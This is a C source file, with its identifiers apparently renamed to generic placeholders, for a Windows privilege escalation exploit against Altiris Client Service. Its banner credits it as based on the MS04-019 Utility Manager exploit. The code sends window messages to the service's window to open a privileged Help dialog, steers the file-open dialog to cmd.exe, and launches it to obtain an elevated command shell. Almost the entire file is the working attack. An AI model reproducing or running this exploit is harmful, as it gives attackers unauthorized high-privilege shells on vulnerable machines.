#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct TYPE_3__ {int x; int y; } ;
typedef  TYPE_1__ POINT ;
typedef  int /*<<< orphan*/  LPARAM ;
typedef  scalar_t__ HWND ;

/* Variables and functions */
 scalar_t__ FUNC0 (char*,char*) ; 
 scalar_t__ FUNC1 (scalar_t__,int /*<<< orphan*/ *,char*,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC2 (scalar_t__,int) ; 
 int /*<<< orphan*/  FUNC3 () ; 
 int /*<<< orphan*/  FUNC4 () ; 
 int FUNC5 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC6 (scalar_t__,int,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC7 (scalar_t__,int,int,int) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 int VK_DOWN ; 
 int VK_RETURN ; 
 int VK_TAB ; 
 int /*<<< orphan*/  WM_CLOSE ; 
 int WM_CONTEXTMENU ; 
 int /*<<< orphan*/  WM_IME_KEYDOWN ; 
 int /*<<< orphan*/  WM_KEYDOWN ; 
 int /*<<< orphan*/  WM_SETTEXT ; 
 scalar_t__ FUNC9 (TYPE_1__) ; 
 size_t FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 
 int /*<<< orphan*/  FUNC12 (char*,char*) ; 

int FUNC13(int argc, char* argv[])
{
 HWND lHandle, lHandle2;
 POINT point;
 int id,a=0;
 char langH[255][255];
 char langO[255][255];
 char wname[]="Altiris Client Service";
 
 FUNC12(langH[0x0c],"Aide de Windows");
 FUNC12(langH[0x09],"Windows Help");
 FUNC12(langH[0x0a],"Ayuda de Windows");
 
 FUNC12(langO[0x0c],"Ouvrir");
 FUNC12(langO[0x09],"Open");
 FUNC12(langO[0x0a],"Abrir");
 
 FUNC11("##########################################################\n");
 FUNC11("#                  Altiris Client Service                #\n");
 FUNC11("# WM_COMMANDHELP Windows Privilege Escalation Exploit    #\n");
 FUNC11("# by sirdarckcat & alt3kx                                #\n");
 FUNC11("#                                                        #\n");
 FUNC11("# This exploit is based on www.milw0rm.com/exploits/350  #\n");
 FUNC11("# Utility Manager Privilege Elevation Exploit (MS04-019) #\n");
 FUNC11("# by Cesar Cerrudo                                       #\n");
 FUNC11("##########################################################\n\n");
  
 id=FUNC5(FUNC3());
 if (id==0 && (id=FUNC5(FUNC4()))){
    FUNC11("Lang not found, using english\n");
    id=9;
 }

 char sText[]="%windir%\\system32\\cmd.ex?";

 if (argc<2){
    FUNC11("Use:\n> %s [LANG-ID]\n\n",argv[0]);
    FUNC11("Look for your LANG-ID here:\n");
    FUNC11("http://msdn2.microsoft.com/en-us/library/ms776294.aspx\n");
    FUNC11("\nAnyway, the program will try to guess it.\n\n");
    return 0;
 }else{
    if (argc==2){
       if (langH[FUNC10(argv[1])]){
          id=FUNC10(argv[1]);
          FUNC11("Lang changed\n");
       }else{
          FUNC11("Lang not supported\n",id);
       }
    }
 }
 FUNC11("Using Lang %d\n",id);
 FUNC11("Looking for %s..\n",wname);
 lHandle=FUNC0(NULL, wname);   
 if (!lHandle) {
  FUNC11("Window %s not found\n", wname);
  return 0;
 }else{
  FUNC11("Found! exploiting..\n");
 }
 FUNC6(lHandle,0x313,NULL,NULL);
 
 FUNC8(100);

 FUNC7(lHandle,0x365,NULL,0x1);
 FUNC8(300);
 pp:
 if (!FUNC0(NULL, langH[id])){
    FUNC11("Help Window not found.. exploit unsuccesful\n");
    if (id!=9){
       FUNC11("Trying with english..\n");
       id=9;
       goto pp;
    }else{
          return 0;
    } 
 }else{
    FUNC11("Help Window found! exploiting..\n");
 } 
 FUNC7 (FUNC0(NULL, langH[id]), WM_IME_KEYDOWN, VK_RETURN, 0);
 FUNC8(500);
 lHandle = FUNC0("#32770",langO[id]);
 lHandle2 = FUNC2(lHandle, 0x47C);
 FUNC8(500);
 FUNC11("Sending path..\n");
 FUNC7 (lHandle2, WM_SETTEXT, 0, (LPARAM)sText);
 FUNC8(800);
 FUNC7 (lHandle2, WM_IME_KEYDOWN, VK_RETURN, 0);
 lHandle2 = FUNC2(lHandle, 0x4A0);
 FUNC11("Looking for cmd..\n"); 
 FUNC7 (lHandle2, WM_IME_KEYDOWN, VK_TAB, 0);
 FUNC8(500);
 lHandle2 = FUNC1(lHandle,NULL,"SHELLDLL_DefView", NULL);
 lHandle2 = FUNC2(lHandle2, 0x1);
 FUNC11("Sending keys..\n");
 FUNC7 (lHandle2, WM_IME_KEYDOWN, 0x43, 0);
 FUNC7 (lHandle2, WM_IME_KEYDOWN, 0x4D, 0);
 FUNC7 (lHandle2, WM_IME_KEYDOWN, 0x44, 0);
 FUNC8(500);
 mark:
 FUNC6 (lHandle2, WM_CONTEXTMENU, 0, 0);
 FUNC8(1000);
 point.x =10; point.y =30;
 lHandle2=FUNC9(point);
  FUNC8(1000);
 FUNC11("Opening shell..\n");
 FUNC7 (lHandle2, WM_KEYDOWN, VK_DOWN, 0);
  FUNC8(1000);
 FUNC7 (lHandle2, WM_KEYDOWN, VK_DOWN, 0);
  FUNC8(1000);
 FUNC7 (lHandle2, WM_KEYDOWN, VK_RETURN, 0);
  FUNC8(1000);
 if (!FUNC0(NULL,"C:\\WINDOWS\\system32\\cmd.exe") && !FUNC0(NULL,"C:\\WINNT\\system32\\cmd.exe")){
    FUNC11("Failed\n");
    if (!a){
        a++;
        goto mark;
    }
 }else{
       FUNC11("Done!\n");
 }
 if(!a){
    FUNC7 (lHandle, WM_CLOSE,0,0);
    FUNC8(500);
    FUNC7 (FUNC0(NULL, langH[id]), WM_CLOSE, 0, 0);
    FUNC7 (FUNC0(NULL, argv[1]), WM_CLOSE, 0, 0);
 }else{
    FUNC11("The exploit failed, but maybe the context window of the shell is visibile.\n");
 }
 return 0;
}